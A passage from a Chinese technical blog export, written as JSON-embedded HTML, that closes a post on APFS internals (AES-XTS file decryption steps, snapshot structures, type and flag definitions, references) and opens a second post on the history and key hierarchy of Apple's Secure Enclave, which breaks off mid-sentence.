0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>如果<code>ov_flags</code>设置了<code>OMAP_VAL_ENCRYPTED</code>标志位，则位于<code>ov_paddr</code>的虚拟对象已经被加密，<br>对于第一个512字节的数据块，可以基于物理位置确定 Tweak value，后续512字节的数据块则依次递增。</p>\n<p><code>uint64_t tweak0 = (ov_paddr * block_size) / 512;</code></p>\n<h4 id=\"文件内容的解密\"><a href=\"#文件内容的解密\" class=\"headerlink\" title=\"文件内容的解密\"></a>文件内容的解密</h4><ol>\n<li>基于 Volume Superblock 的<code>apfs_root_tree_oid</code>字段找到 Root Directory 的对象映射</li>\n<li>使用 VEK 作为AES-XTS 主密钥，解封并访问文件系统树</li>\n<li>查找加密文件的文件范围记录<code>APFS_TYPE_FILE_EXTENT</code></li>\n<li>查找加密状态记录<code>APFS_TYPE_CRYPTO_STATE</code>，其标识符等于<code>j_file_extent_val.crypto_id</code></li>\n<li>使用 VEK 作为主密钥，<code>Crypto_id</code>的值作为 Tweak key，执行 AES-XTS 解密相应的数据块</li>\n</ol>\n<blockquote>\n<p>TODO: 第四步来自 APFS白皮书，似乎 FDE 模式不需要？</p>\n</blockquote>\n<h2 id=\"六、Snapshot\"><a href=\"#六、Snapshot\" class=\"headerlink\" title=\"六、Snapshot\"></a>六、Snapshot</h2><p>快照（Snapshot）是现代文件系统的重要功能，可以在给定时间点获得一个稳定的、只读的文件系统副本，例如用于硬盘的增量备份。快照的设计目标是可以快速而且低成本的创建，但付出的代价是删除快照需要更多的工作。</p>\n<h3 id=\"1-Snapshot-Metadata-Record\"><a href=\"#1-Snapshot-Metadata-Record\" class=\"headerlink\" title=\"1. Snapshot Metadata Record\"></a>1. Snapshot Metadata Record</h3><p>快照也是一个基于 B-树 的应用，鉴于快照的数据量可能较大，因此又建立了一个名为<code>Extent Reference</code>的 B-树 用于保存实际的内容数据，而在 snapshot 记录中仅保存其元数据 metadata ，定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_metadata_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;                        <span class=\"comment\">// 就是这个快照对应的 xid</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_metadata_key</span> <span class=\"title\">j_snap_metadata_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_metadata_val</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span>       extentref_tree_oid;     <span class=\"comment\">// 内容数据的 oid，保存在 ExtentRef tree</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span>       sblock_oid;             <span class=\"comment\">// 快照为卷宗超级块建立副本，这是超级块的 oid</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>    create_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>    change_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>    inum;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    extentref_tree_type;    <span class=\"comment\">// 默认就是 B-树</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    flags;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>    name_len;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     name[<span class=\"number\">0</span>];                <span class=\"comment\">// 快照名称，UTF-8编码</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_metadata_val</span> <span class=\"title\">j_snap_metadata_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Snapshot-Name-Records\"><a href=\"#2-Snapshot-Name-Records\" class=\"headerlink\" title=\"2. Snapshot Name Records\"></a>2. Snapshot Name Records</h3><p>快照名称记录用于将快照名称映射到其事务标识符。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_name_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> name_len;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> name[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_name_key</span> <span class=\"title\">j_snap_name_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_name_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">xid_t</span> snap_xid;                     <span class=\"comment\">// 快照中最后一个事务的 xid</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_snap_name_val</span> <span class=\"title\">j_snap_name_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Snapshot-Extended-Reference-Metadata-Object\"><a href=\"#3-Snapshot-Extended-Reference-Metadata-Object\" class=\"headerlink\" title=\"3. Snapshot Extended Reference Metadata Object\"></a>3. Snapshot Extended Reference Metadata Object</h3><p>每个快照都有一个虚拟对象，用于保存快照扩展信息的元数据，其 oid 保存在该卷宗超级块的<code>apfs_snap_meta_ext_oid</code>字段中，映射关系记录在该卷宗的 OMAP 上。快照的虚拟对象有多个版本，其事务标识符 xid 对应每个版本。</p>\n<blockquote>\n<p>Each snapshot has a virtual Snapshot Extended Metadata Object in the volume’s Object Map. The virtual object identifier of this object is stored in the apfs_snap_meta_ext_oid field of the Volume Superblock. There are multiple versions of this object whose transaction identifiers correspond to each snapshot.</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">snap_meta_ext_obj_phys</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span>      smeop_o; </span><br><span class=\"line\">    <span class=\"type\">snap_meta_ext_t</span> smeop_sme;      <span class=\"comment\">// 具体结构在下面</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">snap_meta_ext_obj_phys_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">snap_meta_ext</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    sme_version;        <span class=\"comment\">// 当前版本号=1</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    sme_flags;</span><br><span class=\"line\">    <span class=\"type\">xid_t</span>       sme_snap_xid;       <span class=\"comment\">// 快照对应的 xid</span></span><br><span class=\"line\">    <span class=\"type\">uuid_t</span>      sme_uuid;           <span class=\"comment\">// 快照的 UUID</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>    sme_token;</span><br><span class=\"line\">&#125; __attribute__((packed))</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">snap_meta_ext</span> <span class=\"title\">snap_meta_ext_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"七、遗留问题\"><a href=\"#七、遗留问题\" class=\"headerlink\" title=\"七、遗留问题\"></a>七、遗留问题</h2><h3 id=\"1-AFPS-白皮书中介绍的-media-keybag-是什么？\"><a href=\"#1-AFPS-白皮书中介绍的-media-keybag-是什么？\" class=\"headerlink\" title=\"1. AFPS 白皮书中介绍的 media_keybag 是什么？\"></a>1. AFPS 白皮书中介绍的 media_keybag 是什么？</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">media_keybag</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span> mk_obj;</span><br><span class=\"line\">    <span class=\"type\">kb_locker_t</span> mk_locker;          <span class=\"comment\">// 密钥包入口，结构见下！</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2020年6月，增加定义：<code>#define OBJECT_TYPE_MEDIA_KEYBAG &#39;mkey&#39;</code><br>APFS 的描述：A keybag, wrapped up as a container-layer object.<br>nx_mkb_locker : Wrapped media key.</p>\n<p>KB_TAG_WRAPPING_M_KEY:<br>The key data stores a key thatʼs used to wrap a media key.</p>\n<p>初步分析，media key 应该是 2020年 Apple 版本升级的产物，负责封装数据宗卷上的元数据。</p>\n<p>Apple 安全白皮书介绍：</p>\n<blockquote>\n<p>When deleting a volume, its volume encryption key is securely deleted by the Secure Enclave.<br>This helps prevent future access with this key even by the Secure Enclave.<br>In addition, all volume encryption keys are wrapped with a media key.<br>The media key doesn’t provide additional confidentiality of data; instead, it’s designed to enable swift and secure deletion of data because without it decryption is impossible.<br>On a Mac with Apple silicon and those with the T2 chip, the media key is guaranteed to be erased by the Secure Enclave supported technology—for example by remote MDM commands.<br>Erasing the media key in this manner renders the volume cryptographically inaccessible.<br>media key Part of the encryption key hierarchy that helps provide for a secure and instant wipe.<br>In iOS, iPadOS, tvOS, and watchOS, the media key wraps the metadata on the data volume (and thus without it access to all per-file keys is impossible, rendering files protected with Data Protection inaccessible).<br>In macOS, the media key wraps the keying material, all metadata, and data on the FileVault protected volume. In either case, wipe of the media key renders encrypted data inaccessible.</p>\n</blockquote>\n<hr>\n<h2 id=\"附录一：一些重要的类型定义\"><a href=\"#附录一：一些重要的类型定义\" class=\"headerlink\" title=\"附录一：一些重要的类型定义\"></a>附录一：一些重要的类型定义</h2><h3 id=\"1-Object-Type-的定义\"><a href=\"#1-Object-Type-的定义\" class=\"headerlink\" title=\"1. Object Type 的定义\"></a>1. Object Type 的定义</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_NX_SUPERBLOCK       0x00000001  <span class=\"comment\">// Container superblock</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_BTREE               0x00000002  <span class=\"comment\">// Root node</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_BTREE_NODE          0x00000003  <span class=\"comment\">// inode</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SPACEMAN            0x00000005  <span class=\"comment\">// Space Manager</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SPACEMAN_CAB        0x00000006</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SPACEMAN_CIB        0x00000007</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SPACEMAN_BITMAP     0x00000008</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SPACEMAN_FREE_QUEUE 0x00000009</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_EXTENT_LIST_TREE    0x0000000a</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_OMAP                0x0000000b  <span class=\"comment\">// Object Map, B-Tree</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_CHECKPOINT_MAP      0x0000000c  <span class=\"comment\">// Checkpoint</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_FS                  0x0000000d  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_FSTREE              0x0000000e</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_BLOCKREFTREE        0x0000000f</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SNAPMETATREE        0x00000010</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_NX_REAPER           0x00000011</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_NX_REAP_LIST        0x00000012</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_OMAP_SNAPSHOT       0x00000013</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_EFI_JUMPSTART       0x00000014</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_FUSION_MIDDLE_TREE  0x00000015  <span class=\"comment\">// Fusion是Apple开发的混合磁盘技术</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_NX_FUSION_WBC       0x00000016</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_NX_FUSION_WBC_LIST  0x00000017</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_GBITMAP             0x00000019</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_GBITMAP_TREE        0x0000001a</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_GBITMAP_BLOCK       0x0000001b</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_ER_RECOVERY_BLOCK   0x0000001c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_SNAP_META_EXT       0x0000001d</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_INTEGRITY_META      0x0000001e</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_FEXT_TREE           0x0000001f</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_RESERVED_20         0x00000020</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_INVALID             0x00000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_TEST                0x000000ff</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_CONTAINER_KEYBAG    <span class=\"string\">&#x27;keys&#x27;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_VOLUME_KEYBAG       <span class=\"string\">&#x27;recs&#x27;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJECT_TYPE_MEDIA_KEYBAG        <span class=\"string\">&#x27;mkey&#x27;</span></span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Object-Flag-的定义\"><a href=\"#2-Object-Flag-的定义\" class=\"headerlink\" title=\"2. Object Flag 的定义\"></a>2. Object Flag 的定义</h3><p>区分存储方式，即：虚拟对象、物理对象、或临时对象</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_VIRTUAL         0x00000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_EPHEMERAL       0x80000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_PHYSICAL        0x40000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_NOHEADER        0x20000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_ENCRYPTED       0x10000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_NONPERSISTENT   0x08000000   </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Volume-Flag-的定义\"><a href=\"#3-Volume-Flag-的定义\" class=\"headerlink\" title=\"3. Volume Flag 的定义\"></a>3. Volume Flag 的定义</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_UNENCRYPTED                 0x00000001LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_RESERVED_2                  0x00000002LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_RESERVED_4                  0x00000004LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_ONEKEY                      0x00000008LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_SPILLEDOVER                 0x00000010LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_RUN_SPILLOVER_CLEANER       0x00000020LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_ALWAYS_CHECK_EXTENTREF      0x00000040LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_RESERVED_80                 0x00000080LL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_RESERVED_100                0x00000100LL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_FLAGS_VALID_MASK            (APFS_FS_UNENCRYPTED \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_RESERVED_2 \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_RESERVED_4 \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_ONEKEY \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_SPILLEDOVER \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_RUN_SPILLOVER_CLEANER \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_ALWAYS_CHECK_EXTENTREF \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_RESERVED_80 \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_RESERVED_100)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FS_CRYPTOFLAGS                 (APFS_FS_UNENCRYPTED \\</span></span><br><span class=\"line\"><span class=\"meta\">                                            | APFS_FS_ONEKEY)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Volume-Role-的定义\"><a href=\"#4-Volume-Role-的定义\" class=\"headerlink\" title=\"4. Volume Role 的定义\"></a>4. Volume Role 的定义</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_NONE 0x0000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_SYSTEM 0x0001</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_USER 0x0002</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_RECOVERY 0x0004</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_VM 0x0008</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_PREBOOT 0x0010</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_INSTALLER 0x0020</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* macOS 10.15、iOS 13 重新定义了 Volume 角色 */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_DATA (1 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_BASEBAND (2 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_UPDATE (3 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_XART  (4 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_HARDWARE (5 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_BACKUP (6 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_RESERVED_7 (7 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_RESERVED_8 (8 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_ENTERPRISE (9 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_RESERVED_10 (10 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_ROLE_PRELOGIN (11 &lt;&lt; APFS_VOLUME_ENUM_SHIFT)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOLUME_ENUM_SHIFT 6</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://jtsylve.blog/post/2022/12/26/APFS-Decryption\">APFS 深度分析系列 - Dr. Joe T.Sylve</a></li>\n<li><a href=\"https://static.ernw.de/whitepaper/ERNW_Whitepaper65_APFS-forensics_signed.pdf\">APFS 技术白皮书 - ERNW.de</a></li>\n<li><a href=\"https://www.ntfs.com/apfs-structure.htm\">ApFS Structure - NTFS.com</a></li>\n<li><a href=\"APFS-ref.pdf\">APFS 数据结构参考图</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Fork_(file_system)\">Fork (file system) - Wiki</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33656976\">谈谈 Mac OS 的文件系统</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://www.rfc-editor.org/rfc/rfc3394\">RFC 3394 - AES密钥包裹算法</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/X.690#DER_encoding\">X.690 DER编码 - Wiki</a></li>\n</ul>\n<h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><ul>\n<li><a href=\"https://github.com/libyal/libfsapfs/blob/main/documentation/Apple%20File%20System%20(APFS).asciidoc\">libfsapfs 源代码的技术文档 - Github</a></li>\n<li><a href=\"https://github.com/linux-apfs/apfsprogs\">apfsprogs：Experimental APFS tools for linux - Github</a></li>\n</ul>\n"},{"title":"Apple安全隔区（Secure Encalve）技术概览","url":"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/","content":"<h2 id=\"一、Apple平台安全性-软件-硬件-服务\"><a href=\"#一、Apple平台安全性-软件-硬件-服务\" class=\"headerlink\" title=\"一、Apple平台安全性 &#x3D; 软件 + 硬件 + 服务\"></a>一、Apple平台安全性 &#x3D; 软件 + 硬件 + 服务</h2><p><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">apple平台安全白皮书</a>指出，Apple平台安全性的核心理念是：强调硬件、软件和服务的紧密联系和共同协作，为智能终端（iOS）、台式设备（MacOS）、可穿戴设备（WatchOS）和家居设备等不同类型设备提供具备独特性的安全性架构，目标是在为用户提供最高的安全性和透明的使用体验，其中：</p>\n<ul>\n<li>硬件：遵循“<strong>支持有限且单独定义的功能</strong>”的准则，依托Apple自行设计的芯片和安全性硬件，为关键的安全性功能提供支持，以使攻击面最小化</li>\n<li>软件：通过软件保护为操作系统和第三方App提供了安全保障</li>\n<li>服务：通过服务提供安全且及时的软件更新机制，帮助建立受保护的App生态系统，并保障通信和支付的安全</li>\n</ul>\n<p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/framework.png\" alt=\"技术架构\"></p>\n<p>需要注意的是，Apple安全体系中有三个最核心的密钥，分别是：</p>\n<ul>\n<li>UID：一个 256 位的 AES 密钥，在设备制造过程中刻录在每个处理器上。这种密钥无法由固件或软件读取，只能由处理器的硬件 AES 引擎使用。UID 与设备上的任何其他标识符均无关，包括但不限于 UDID</li>\n<li>GID：设备组ID，类似于 UID，但同一类中的每个处理器的 GID 都相同</li>\n<li>用户密码：iOS中称为passcode，MacOS中称为password，由用户自行设置,一般是4位数字、6位数字或无限长度的字母组合</li>\n</ul>\n<h2 id=\"二、Secure-Enclave的发展历程\"><a href=\"#二、Secure-Enclave的发展历程\" class=\"headerlink\" title=\"二、Secure Enclave的发展历程\"></a>二、Secure Enclave的发展历程</h2><p>对苹果来说，自研芯片已经成为了一种寻求产品差异化的手段，这不仅在 iPhone 上有所体现，你在 Mac 电脑、Apple Watch 手表和 AirPods 耳机中都能找到苹果芯片的身影。</p>\n<h3 id=\"1-A系列主处理器（iOS）\"><a href=\"#1-A系列主处理器（iOS）\" class=\"headerlink\" title=\"1. A系列主处理器（iOS）\"></a>1. A系列主处理器（iOS）</h3><p>2013年，Apple发布了iPhone 5S，首次支持了指纹识别设备Touch ID，为此需要解决一个关键问题，如何安全地存储生物特征数据？显而易见的是，单纯的软件方案或云端方案肯定无法获得消费者和监管机构的安全认可。<br>iPhone 5S的 CPU 是基于 ARMv8 架构的<strong>A7</strong>自研芯片，为了实现本地级别的加密和安全，其设计了一个专门的协处理器用于实现本地级别的加密和安全，这就是安全隔区Secure Enclave。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/apple-A.jpeg\" alt=\"A\"></p>\n<h3 id=\"2-M-T-系列主处理器（MacOS）\"><a href=\"#2-M-T-系列主处理器（MacOS）\" class=\"headerlink\" title=\"2. M(T)系列主处理器（MacOS）\"></a>2. M(T)系列主处理器（MacOS）</h3><p>传统上，Mac个人电脑是基于Intel的芯片，因此在硬件安全性上受到严重的制约，为此Apple只能通过引入额外的 T2 芯片来支撑安全特性。</p>\n<p>2016年，苹果开始为新 MacBook 加入名为<strong>T1</strong>的自研芯片，当时主要是为了驱动 TouchBar 触控条的运行，同时也负责指纹识别的安全管理。<br>2017年，苹果在发布 iMac Pro时，发布了升级版的 T2 芯片.<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/t2.png\" alt=\"T2\"></p>\n<p>2020年，Apple发布了首款专为MacOS打造的M1芯片，将中央处理器、输入输出、安全隔区等功能统统整合在同一块芯片，为全面淘汰Intel CPU做好了准备，也表明T系列安全芯片即将终结。</p>\n<h3 id=\"3-S系列主处理器（WatchOS）\"><a href=\"#3-S系列主处理器（WatchOS）\" class=\"headerlink\" title=\"3. S系列主处理器（WatchOS）\"></a>3. S系列主处理器（WatchOS）</h3><p>2015年，Apple发布了Apple Watch，采用自研的S1芯片，运行watchOS操作系统，目前已经发展到 S8 和 WatchOS 9.0。<br>S系列处理器同样包含安全隔区，为生物特征数据的采集和存储提供安全解决方案。<br>此外，Apple TV HD 、HomePod 和 HomePod mini等各类Apple产品都搭载安全隔区。</p>\n<p>总结一下，通过Secure 